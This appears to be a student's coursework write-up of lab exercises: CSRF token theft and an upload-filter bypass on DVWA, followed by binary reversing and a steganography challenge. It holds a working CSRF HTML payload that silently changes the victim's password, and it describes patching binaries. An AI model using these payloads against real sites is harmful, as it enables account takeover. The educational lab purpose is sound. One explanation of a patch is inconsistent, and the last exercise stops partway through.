# Part 1 - Advanced Web Exploits
# Exercise 1

> [!exercise] Exercise 1 - CSRF Token Stealing
>
> When on the high-security setting of DVWA, a unique ANTI-CSRF token is created each time the password change page is accessed, as shown in the workshop. To launch a CSRF attack in this case, we first need to steal the token. Create an HTML (name it: 'csrf.html') file that can steal the token from the DVWA CSRF page and change the password to 'csf2024s1'.
>
> **Answer:**
>
> The default `html` file already does the stealing for us, we just need to add the `hacklab IP` to the `source` and `url` variables.
>
> ```html
> <html>
> <body>
>     <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
>     <iframe id="myFrame" src="http://192.168.56.102/DVWA/vulnerabilities/csrf/" style="visibility: hidden;"
>         onload="maliciousPayload()"></iframe>
>     <script>
>         function maliciousPayload() {
>             console.log("start");
>             var iframe = document.getElementById("myFrame");
>             var doc = iframe.contentDocument;
>             var token = doc.getElementsByName("user_token")[0].value;
>             const http = new XMLHttpRequest();
>             const url = "http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=csf2024s1&password_conf=csf2024s1&Change=Change&user_token=" + token + "#";
>             http.open("GET", url);
>             http.send();
>             console.log("password changed");
>         }
>     </script>
> </body>
> </html>
> ```


<div style="page-break-after: always;"></div>

# Exercise 2

> [!exercise] Exercise 2 - Uploading the CSRF File
>
> Set the DVWA security level to MEDIUM. Upload the csrf.html file to the "hackable/uploads/" folder. Provide details of the steps you use to upload the HTML file with the security level set at medium.
>
> **Answer:**
>
> This was the exact same exercise from the workshop. Since the file upload only takes images, we simply intercept the packet in burp, change the content type to `image/jpeg` and forward it! 
> 
> ![[Pasted image 20240515072304.png]]
> 
> If we navigate to `<hacklab>/DVWA/hackable/uploads`, we can see the `html` file inside the directory.
> 
> ![[Pasted image 20240515072457.png|400]]

<div style="page-break-after: always;"></div>

# Exercise 3

> [!exercise] Exercise 3 - Triggering the Malicious HTML
>
> Show that after a user visits `http://[hacklabvm_ip]/hackable/uploads/csrf.html`, the password changes to 'csf2024s1'. Explain what happened.
>
> **Answer:**
>
> Clicking on the `csrf.html` file inside the uploads directory, we can see that the malicious script has executed and the password has been changed!
> 
> ![[Pasted image 20240515074706.png]]
> 
> The HTML code creates an invisible `iframe` that loads the DVWA CSRF page. When the `iframe` loads, it **triggers a function that steals the CSRF token from the page, constructs a malicious password change URL with the stolen token, and sends the request to change the password** to "csf2024s1" without the user's knowledge.
> 
> Modern browsers enforce the Same-Origin Policy (SOP) by default, which prevents malicious requests originating from domains other than the main website. To bypass this security measure, the **malicious HTML file needs to be hosted on the same domain as the target website**. That's why the **file is uploaded to the hacklab itself**, ensuring that the attack originates from the same domain and successfully changes the password.

<div style="page-break-after: always;"></div>

# Part 2 - Digital Forensics

# Exercise 4

> [!exercise] Exercise 4 - Reversing (1)
>
> Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689600/download?download_frd=1). You can run it as `./q1` in Linux. You are not allowed to patch this program. Use Ghidra, Cutter, or Radare2 (or something else) to decompile and deduce the password required for revealing the secret. Get the program to print the secret.
>
> **Answer:**
> I started off by `chmod'ing` the program to make it executable and tried executing it. It's asking for a password, so I now I know to **look for some kind of input validation** inside Ghidra.
> ```
> samchau@SamPC:~/workshop10$ ./q1
> What is the password?
> ```
>
> Reviewing the decompiled `main` function in `Ghidra`, we find it's checking if `var1` is **"I Love Cyber Security!".** Let's try this as the password!
> ```c
> undefined8 main(void)
> {
>   int iVar1;
>   long in_FS_OFFSET;
>   char local_418 [1032];
>   long local_10;
>
>   local_10 = *(long *)(in_FS_OFFSET + 0x28);
>   puts("What is the password?");
>   fgets(local_418,0x400,stdin);
>   strtok(local_418,"\n");
>   rot(local_418,0xd);
>   iVar1 = strcmp(local_418,"I Love Cyber Security!");
>   if (iVar1 == 0) {
>     print_secret();
>   }
>   else {
>     puts("Sorry, wrong password...");
>   }
>   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
>     /* WARNING: Subroutine does not return */
>     __stack_chk_fail();
>   }
>   return 0;
> }
> ```
> ```
> samchau@SamPC:~/workshop10$ ./q1
> What is the password?
> I Love Cyber Security!
> Sorry, wrong password...
> ```
>
> That did not seem to work. Let's review the decompiled code again. It seems that the input is being passed to a function called `rot` before being compared to the expected password.
> ```c
> void rot(byte *param_1,char param_2)
>
> {
>   byte *local_10;
>   
>   for (local_10 = param_1; *local_10 != 0; local_10 = local_10 + 1) {
>     if (((0x60 < *local_10) && (*local_10 < 0x7b)) &&
>        (*local_10 = param_2 + *local_10, 0x7a < *local_10)) {
>       *local_10 = *local_10 - 0x1a;
>     }
>     if (((0x40 < *local_10) && (*local_10 < 0x5b)) &&
>        (*local_10 = param_2 + *local_10, 0x5a < *local_10)) {
>       *local_10 = *local_10 - 0x1a;
>     }
>   }
>   return;
> }
> ```
>
> We can see that it applies a custom rotation cipher to the input string. Each character is shifted by the value specified in `param_2`, which is `0xd` (13 in decimal) in the `main` function. The rotation is performed separately for lowercase and uppercase letters, and it wraps around the alphabet when necessary.
>
> To reverse engineer the password, we can write a Python script that applies the same rotation cipher to the string "I Love Cyber Security!" with a rotation value of 13.
> ```python 
> def rot_reverse(string, rotation):
>     result = ""
>     for char in string:
>         if char.isalpha():
>             ascii_offset = 65 if char.isupper() else 97
>             result += chr((ord(char) - ascii_offset + rotation) % 26 + ascii_offset)
>         else:
>             result += char
>     return result
>
> password = "I Love Cyber Security!"
> decoded_password = rot_reverse(password, 13)
> print(decoded_password)
> ```
>
> Running the script gives us the decoded password:
> ```
> samchau@SamPC:~/workshop10$ python3 rot_reverse.py
> V Ybir Plore Frphevgl!
> ```
>
> Let's try this password in the program:
> ```
> samchau@SamPC:~/workshop10$ ./q1
> What is the password?
> V Ybir Plore Frphevgl!
>  _________________________________________
> / On the sea of the heavens Waves of      \
> | cloud arise, The moon-a boat- Amongst a |
> | forest of stars Rows on, hidden, or so  |
> \ it seems.                               /
>  -----------------------------------------
>  \     /\  ___  /\
>   \   // \/   \/ \\
>      ((    O O    ))
>       \\ /     \ //
>        \/  | |  \/ 
>         |  | |  |  
>         |  | |  |  
>         |   o   |  
>         | |   | |  
>         |m|   |m|  
> ```
>
> Success! We entered the decoded password "V Ybir Plore Frphevgl!" and the program printed the secret ASCII art. By reverse engineering the `rot` function, we were able to determine the correct password and reveal the hidden secret.


<div style="page-break-after: always;"></div>

# Exercise 5

> [!exercise] Exercise 5 - Reversing (2)
>
> **q2. [2 points]** Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689600/download?download_frd=1). You can run it as `./q2` in Linux. You are not allowed to patch this program. Use Ghidra, Cutter, or Radare2 (or something else) to decompile and deduce the secret.
>
> **Answer:**
> Let's start by executing the program and see what happens:
> ```
> samchau@SamPC:~/workshop10$ ./q2
> Sorry no secret for you!
> ```
>
> Hmm, it seems like the program is not revealing the secret. Let's decompile the program using Ghidra and analyze the `main` function:
> ```c
> undefined8 main(void)
> {
>   hostent *phVar1;
>
>   phVar1 = gethostbyname("csf.is.a.great.course.yay");
>   if (phVar1 == (hostent *)0x0) {
>     puts("Sorry no secret for you!");
>   }
>   else {
>     print_secret();
>   }
>   return 0;
> }
> ```
> 
> The `main` function is calling the `gethostbyname` function with the argument "`csf.is.a.great.course.yay`". The `gethostbyname` function is used to resolve a hostname to an IP address. If the hostname resolution fails (i.e., if `phVar1` is NULL), the program prints "Sorry no secret for you!". Otherwise, it calls the `print_secret` function.
> 
> To get the program to reveal the secret, we need to ensure that the hostname "csf.is.a.great.course.yay" resolves to a valid IP address. We can achieve this by adding an entry in the `/etc/hosts` file on our Linux system.
>
> Open the `/etc/hosts` file with root privileges using a text editor. For example:
> ```
> sudo nano /etc/hosts
> ```
>
> Add the following line to the file:
> ```
> 127.0.0.1   csf.is.a.great.course.yay
> ```
>
> Save the file and exit the text editor.
>
> Now, when we run the program again, it should be able to resolve the hostname "`csf.is.a.great.course.yay`" to the IP address 127.0.0.1 (localhost), and the `print_secret` function will be called.
> ```
> samchau@SamPC:~/workshop10$ ./q2-2
>  _________________________________________
> / This world Does not go on foreever- Men \
> | know it, yet With the chilly autumn     |
> \ wind How I feel it now.                 /
>  -----------------------------------------
>   \
>    \
>       /\_)o<
>      |      \
>      | O . O|
>       \_____/
> ```
>
> Success! By adding an entry in the `/etc/hosts` file, we tricked the program into thinking that "`csf.is.a.great.course.yay`" is a valid hostname resolving to the localhost IP address. This allowed us to bypass the hostname resolution check and reveal the secret ASCII art.

> [!exercise] Exercise 6 - Reversing (3)
>
> **q3. [2 points]** Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689603/download?download_frd=1). You can run it as `./q3` in Linux. You should patch this program to get it to reveal the secret using Ghidra/Cutter/Radare2 (as per workshop, Cutter is easiest, but feel free to use any program). Use the modified (patched) program to print the secret.
>
> **Answer:**
>
> Let's start by executing the program and see what happens:
> ```
> samchau@SamPC:~/workshop10$ chmod +x q3-2
> samchau@SamPC:~/workshop10$ ./q3-2
> try harder
> ```
>
> The program seems to be printing "try harder" and not revealing the secret. Let's decompile the program using Ghidra and analyze the `main` function:
> ```c
> undefined8 main(int param_1)
> {
>   if (param_1 < 0xf4241) {
>     puts("try harder");
>   }
>   else {
>     print_secret();
>   }
>   return 0;
> }
> ```
>
> The `main` function takes an integer parameter `param_1`. It compares `param_1` with the hexadecimal value `0xf4241`. If `param_1` is less than `0xf4241`, it prints "try harder". Otherwise, it calls the `print_secret` function.
>
> To get the program to reveal the secret, **we need to patch the binary so that the condition `param_1 < 0xf4241` always evaluates to false**. One way to achieve this is to change the comparison instruction to always jump to the `print_secret` function.
>
> We can patch the binary using Cutter:
>
> Navigating to the `main` function in the disassembly view and finding the line -  `cmp dword [local_4h], 0xf4241`, we can edit the instruction to be NOP, i.e. instructions that are skipped over. 
> 
> ![[Pasted image 20240515101051.png]]
>
> Now, when we run the patched binary, it should always jump to the `print_secret` function regardless of the value of `param_1`.
> ```
> samchau@SamPC:~/workshop10$ ./q3-2
 _________________________________o_______
> / Oh, how ugly! People seeking wisdom and \
> | Not drinking; Look on them well Don't   |
> \ they seem like monkeys?                 /
>  -----------------------------------------
>         \   ^__^
>          \  (@@)\_______
>             (__)\       )\/\
>                 ||----w |
>                 ||     ||
> ```
>
> Success! By patching the binary and replacing the conditional jump with an unconditional jump, we forced the program to always execute the `print_secret` function, revealing the secret ASCII art.




> [!exercise] Exercise 7 - Matryoshka
>
> **q4. [3 points]** Analyze this [Hacktivist2-2.png](https://myuni.adelaide.edu.au/courses/95262/files/14689604/download?download_frd=1) to get the secret.
>
> **Answer:**
>
> ![Hacktivist2-2.png|200](Hacktivist2-2.png)
>
> 1. **Visual Inspection**: Upon initial inspection, the image appears to be a regular PNG file without any obvious signs of hidden information. However, the exercise title "Matryoshka" suggests that there might be multiple layers or hidden data within the image.
>
> 2. **StegSolve:** Next I tried opening the image inside `StegSolve`, as we did in the workshop. Interestingly, we find some static embedded in the red plane. This might indicate that something might have been prepended to the image. 
> 
> ![[Pasted image 20240515102655.png|200]]

Note: The actual solution may require additional steps or specific techniques depending on how the secret is hidden within the image. The provided answer outlines a general approach to tackle the challenge using steganography concepts and tools.


